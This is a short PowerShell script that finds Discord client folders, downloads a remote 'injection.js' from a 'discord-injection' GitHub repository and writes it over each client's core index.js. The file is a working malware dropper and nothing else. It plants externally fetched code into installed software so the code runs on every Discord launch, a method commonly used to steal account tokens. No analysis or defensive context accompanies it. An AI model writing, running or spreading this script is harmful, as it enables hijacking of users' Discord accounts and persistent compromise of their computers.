$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA

function Sex-Discord {
    $paths = Get-ChildItem $roaming | Where-Object { $_.Name -like "*cord*" } | ForEach-Object { Join-Path $local $_.Name }

    foreach ($folder in $paths) {
        $indexPaths = Get-ChildItem "$folder\app-*\modules\discord_desktop_core-*\discord_desktop_core\index.js"

        foreach ($indexPath in $indexPaths) {
            try {
                $sex = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js'
                Set-Content -Path $indexPath.FullName -Value $sex -Encoding UTF8
            } catch {
                Write-Error $_.Exception.Message
            }
        }
    }
}

Sex-Discord
